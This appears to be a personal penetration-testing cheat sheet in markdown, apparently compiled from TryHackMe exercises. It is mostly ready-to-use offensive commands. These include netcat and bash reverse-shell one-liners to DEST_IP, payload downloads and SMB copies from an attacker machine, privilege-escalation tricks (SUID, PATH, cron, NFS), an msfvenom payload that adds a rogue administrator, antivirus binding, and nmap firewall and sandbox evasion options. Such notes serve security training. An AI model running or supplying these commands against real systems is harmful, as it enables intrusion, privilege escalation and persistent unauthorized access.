- [BASIC ENUM](#basic-enum)
- [Existing Tools](#existing-tools)
  - [Ping and Port Scanning](#ping-and-port-scanning)
- [Shells](#shells)
  - [PWNCAT-CS](#pwncat-cs)
  - [Stabilizing](#stabilizing)
- [Privilege Escalation](#privilege-escalation)
  - [shared libraries](#shared-libraries)
  - [capabilities](#capabilities)
  - [Cronjobs](#cronjobs)
  - [PATH](#path)
  - [NFS](#nfs)
  - [Executables](#executables)
    - [Finding Important Files](#finding-important-files)
- [Uploading Files](#uploading-files)
  - [DNS, SMB, SNMP](#dns-smb-snmp)
- [Searchexploit](#searchexploit)
- [Code Analyse](#code-analyse)
- [METASPLOIT](#metasploit)
  - [msfvenom](#msfvenom)
    - [Meterpreter](#meterpreter)
    - [Metasploit with database](#metasploit-with-database)
- [Port Scanning (NMAP - DB\_NMAP - Socat)](#port-scanning-nmap---db_nmap---socat)
  - [Firewal Evasion](#firewal-evasion)
    - [Routes](#routes)
    - [Fragmentation/MTU/Size](#fragmentationmtusize)
  - [Port Forwarding](#port-forwarding)
  - [Summary](#summary)
  - [Sandbox Evasion](#sandbox-evasion)
  - [Memory Dump (more learn)](#memory-dump-more-learn)
  - [Recover files](#recover-files)



# BASIC ENUM
- User/groups
- hostnames
- routing tables
- network shared/services
- application / banner
- firewall
- service
- snmp, dns
- credentials

# Existing Tools
- ls /etc/*release = version, os
- hostname
  
- var/mail
- /etc/hosts
- /etc/resolv.conf
- /usrbin/ /sbin/ = installed apps
- rpm -qa = query packages
- dpkg -l = debian
- who
- w = more powerfull
- id
- last = who used
- sudo -l = commands for invoking user
  - what kind of command can be run
  
- ifconfig - nmcli dev show / ipconfig /all
  
- netstat
  - -a = all listening/non-listening
  - -l = listening
  - -n = numero
  - -t = tcp
  - -u = udp
  - -x = unix
  - -p = process id
  - find open ports
  - tulpn
  - putan
- ss
  - -l = listening
  - -t = tcp
  - -u = udp
  - -n = not resolve
  
- arp -a = find neighbors
- lsof = List Open Files
  - -i = internet

- ps
  - -e = all
  - -f = more info
  - -l = long format
  - -ax/aux = comparable
  - -j = job format

## Ping and Port Scanning
-  hosts: for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
   -  for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
-  
-  ports: for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done

# Shells
- Reverse:
  - [Atacker] LISTENER <---------[Victim]
- - Binding:
  - [Victim] LISTENER <---------[Atacker]

- **Connect**
  - -u = UDP connection
  - nc <LOCAL-IP> <PORT> -e /bin/bash
  - nc DEST_IP DEST_PORT -c "/bin/bash 2>&1"
  - nc DEST_IP DEST_PORT | /bin/bash 2>&1 | nc DEST_IP DEST_PORT+1
  - mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
  - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f”
  - **No NC**:
    - bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
    - bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
    - bash -i >& /dev/tcp/DEST_IP/DEST_PORT 0>&1
  
- **Reverse shell**
  - [More shells](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

- **Listener**
  - nc -nlvp PORT ==> TCP listener
  - nc -ulvnp PORT ==> UDP listener

## PWNCAT-CS
- nc with steroids
- python version => stabilized
- easier to transfer file
- python3 -m venv pwncat-env
- nc.exe -nv 10.9.1.255 1234 < logins.json
- source pwncat-env/bin/activate
- pwncat-cs -lp PORT

## Stabilizing
-  python3 -c 'import pty;pty.spawn("/bin/bash")' = better view
-  python3 -c "import pty;pty.spawn('/bin/bash')"
-  python -c 'import pty; pty.spawn("/bin/bash")'
-  export TERM=xterm = commands like clear
-  ctr + z = back to our shel
-  stty raw -echo; fg = back to reverse shell

# Privilege Escalation
- https://tryhackme.com/room/introtoshells
- https://tryhackme.com/room/linprivesc
- Check list
  - hostname
  - uname -a = sys info, kernel, 
  - /proc/version = process, compiler,
  - /etc/issue = OS info
  - ps a[all]u[who_launched]x[not_terminal]  (all users)| -a | axjf (tree)= process list
  - env = environmental variables
  - cat /etc/passwd | cut -d ":" -f 1 // grep home
  - ifconfig
  - netstat -a | -at [tcp] -au [upd] | -l [listening] | -s [statistic] | -tp [pid] | -i [interface_data]
  - find 2>/dev/null = redirect errors
    - -name, -perm a=x, -mtime
    - find / = directory config
    - -perm -u=s = SUID
    - -name perl*, python*, gcc* = dev tools
    - find / -type f -perm -04000 -ls 2>/dev/null ==> *SUID or SGID* files
    - find / -perm -u=s -type f 2>/dev/null
    - find / -writable 2>/dev/null ==> find writable folders
      - sudo -u OWNER file

- sudo -l
- [for SUID files](https://gtfobins.github.io/gtfobins/find/)

## shared libraries 
- sudo -l ==> LD_PRELOAD ==>   
- https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
- ldd = shared object dependencies

## capabilities
- getcap -r / 2>/dev/null

## Cronjobs
- privilege of the owner
- find script with root privilege
- /etc/crontab
- check if file has no fullpath + create own script with reverse shell

## PATH
- echo $PATH
- export PATH=/path/to/folder:$PATH
- PATH=$PATH:/path/to/folder
- find / -writable 2>/dev/null ==> find writable folders
  - find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u
  - find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u ==> exclude running process

## NFS
- find root key + connect
- /etc/exports ==> find no_root_squash = create x with SUID
- showmount -e target-IP
- mount no_root_squash from /etc/exports

## Executables
-SUID = Set User ID = Run with the privilege of the owner not of the user
- Option 1
  - find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

- Option 2
  - strings /usr/local/bin/suid-env2
  - /bin/bash --version < 4.2
  - function /usr/sbin/service { /bin/bash -p; }
  - export -f /usr/sbin/service
  - /usr/local/bin/suid-env2

### Finding Important Files
- History
  - cat ~/.*history | less
  - .ssh Folder is always a must

# Uploading Files
- Option 1 - starting local server
  1. python3 -m http.server 8000
  2. wget attacker-machine:8000/file.ext
  3. curl attacker-machine:8000/file.ext
  4. [Powershell] powershell **Invoke-WebRequest -Uri** http://10.9.1.255:80/shell.exe **-Outfile** file.exe
  5. make executable: chmod +x file.ext

- https: Create certificate + spawn https server
  - openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
  - python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"

- Option 2 - copy source
  1. Copy code from source and past in the target + save .sh
  2. make executable: chmod +x file.ext
   
- option 3 - smbserver
  -  create server: sudo /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
  -  create client: net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
  -  upload file: copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
  -  smbclient -U USER '//IP/folder'

## DNS, SMB, SNMP
- dig
  - -t AXFR DOMAIN_NAME @DNS_Server = zone transfer
- SMB
  - Server Message Bloc
  - net share

- SNMP
  - Simple Network Management Protocol
  - snmpcheck
  - /opt/snmpcheck/snmpcheck.rb 10.10.84.238 -c COMMUNITY_STRING.

# Searchexploit
- m = copie

# Code Analyse
- snyk --scan-all-unmanaged
  - unpack zip file

# METASPLOIT
- msfconsole
- use exploit/multi/handler
  - post/multi = post exploitation (generic)
  - 
- search
  - platform:
  - type:
  - author:
  - app:
  - name
- show options
- setg => set global valules
- unsetg => unset global values
- background => putting a session in backgrou
- sessions => display sessions
- Direct execution
  - msf -q -x "use exploit/path/to; set payload path/to/payload; set optionsName Name; exploit""

## msfvenom
- Many platforms and formats
- Example generate hex of payload:
  - Method 1
    - msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
  - raw binary file .bin:
    - binary ==> msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
  - convert to hex:
    - xxd -i file.bin ==> generate payload for .c

- Stage vs Stageless
  - stageless: shell_reverse_tcp = one thing only
  - staged: /shell/reverse_tcp

- Smaller payloads
  - Payload with a single command: **CMD='net user pwnd Password321 /add;net localgroup administrators pwdn /add'**

- Binding
  - Merge shellcode WITH normal program
  - Fool users
  - still can be detected by AVs
  - Better: encode + encrypt + packers + binder

- Encoding and Encrypting
  - msfvenom --list encoders / encrpyt
  - -e encoder_option
  - -i interation


### Meterpreter
- sysinfo
- getpid
- hashdump (migrate to process first)
- getpid
- getpriv
- migrate PID [try and error, migrating to existing process] + check hashdump
- search


### Metasploit with database
- Basic usage
  - use handler/multi
  - set payload

1. service postgresql start
2. service metasploit start
3. update-rc.d postgresql enable *for performance*
4. update-rc.d metasploit enable *for performance*
5. db_rebuild_cache [in msf console] *for performance*

- db_command ==> db_status, db_nmap etc

- workspace -a (add)
- workspace -d (delete)
- workspace name (move to name)

# Port Scanning (NMAP - DB_NMAP - Socat)
- db_nmap (for metasploit) | nmap
- Scripts
  - --scrip *script_name*: most commom vulnerability scrips, CVEs will be shown
    - https://www.exploit-db.com/
    - https://nvd.nist.gov/vuln/full-listing
  - -sC: other common scripts
  - Search script: **locate -r nse$ | grep NAME**
  
- Basic scans
  - -sS (Syn), -sA(Ack), -sU (UDP)
  - -A: basic scan with OS include
    - -sV -O -sC [default scripts] --traceroute
  - -sV: version of services found
  - -p-: all ports
  - -Pn: no ping
  - -e INTERFACE
  - -PN no ping
  
- Output
  - --reason / -v / -vv / -d / -dd
  - -oN = normal output
  - -oG = grep output

- hosts: list hosts from db
  - -a: add
  - -d: delete
  - -R: inside a exploit/scanner to add the scanned host as RHOST

- services: display services found in scans
 - From services google for vulnerabilities /also search in metasploit
 - Common services: http, ftp, smb, ssh, rdp

## Firewal Evasion
- Stateless: individual package
- Statefull: stablished TCP session (all related packets)
- NGFW: application layer

### Routes 
- Controll source MAC/IP/PORT
- Proxy
  - --proxies proto://host:port,proto://host:port
    - HTTP:HOST1:PORT,SOCKS4://HOST2:Port
    - --proxies IP target
  
- Spoofed address (MAC, IP)
  - --spoof-mac MAC_ADDRESS (spoof mac - same network segment)
  - -S IP (spoof address - same network)
  
- Decoy: random address
  - -D ip,ip,ip,ip,ME
  - -D RMD,RND,RND,ME
  
- Fixed Port
  - -g 123 / --source-port 123 ==> all trafic from the specific port number
  - UPD 53 - dns (looks like dns query)
  - TCP 80 - http (looks like from web server)

### Fragmentation/MTU/Size 
- Size and intensitiy
  - -T[0-5] = Control speed
  - -F = faster
  -  -f = 8 bytes / -ff 16 byes = fragmentation
  - --mtu 128 = custom size
  - --data-length VALUE

- Headers (TTL, IP options, checksum)
  - --ttl # 
  - --ip-options HEX
    - R, T, U ,L ,S 
    - R = record-route
    - T = record timestamp
    - U = route and timestamp
    - L = loose source
    - S = strict source
    - "L IP IP" = loose route packets routed to L IP
    - "S IP IP" = strict route, every hope defined

- Invalid packets
  - --badsum = alterad package
  - --scanflags URG,ACK,PSH,RST,SYN,FYN {SYNRSTFIN}
  - Alternative
    - hping3
      - -t time to live
      - -b badsum
      - -S,-A,-P-U-F-R

## Port Forwarding
- nc -lvnp 443 -c "nc TARGET PORT"
  - -c = --sh-exec
  - -e = --exec

## Summary
|Approach     |NMAP Command                 |
|-------------|-----------------------------|
|Decoy        |-D IP,IP,ME, RND,RND,ME      |
|Proxy        |--proxies URL,HOST:port      |
|Spoofed mac  |--spoof-mac MAC              |
|Spoofed ip   |-S IP                        |
|Src Port     |-g PORT, --source-port PORT  |
|Fragment     |-f 8 bytes, -ff 18 bytes     |
|MTU          |--mtu #                      |
|Lenght packet|--data-length #              | 
|TTL          |--ttl #                      |
|IP options   |-ip-options RTULS            |
|bad sum      |--badsum                     |

## Sandbox Evasion
- Sleeping / Time Evasion
  - [Thead based](https://www.joesecurity.org/blog/660946897093663167#)
  - [Evasions Timing](https://evasions.checkpoint.com/techniques/timing.html)
- Geolocation: find ISP
  - [ifconfig me](https://ifconfig.me/) + [ARINS RDAP](https://rdap.apnic.net/ip/1.1.1.1)
- systeminfo (windows) / lscpu
  - also: hostanme, Sotrage serial number, BIOS/UEFI version, OS version, Network adaptor, Virtualization checks, Signed user
  - less memory or space MAYBE sandbox
- NOT in AD
  - but collect info
  - variables
  - echo %VARIABLE%

**Learn more about it**


## Memory Dump (more learn)
- volatility
  - -f = memory dump file
  - -v = verbosity
  - -p = override location of pluggins
  - -o = outputlit
- Pluggins
  - listing process
  - network connections
  - clipboard, text, cmd
  - imageinfo = find OP
    - python3 vol.py -f file.vmem  windows.info
    - many other pluggins

## Recover files
- lsblk = show all disk
- interact with disk
  - grep 
    - -a binary
    - -P patters
    - -o match
  - strings
- dd = convert/copy file
  - dcfldd: forensict tool to extract file
- df -h = mounted 
- testdisk
- mount
- du: file space
- binwalk: search binary images
  - -M: recursively
  - -e: extract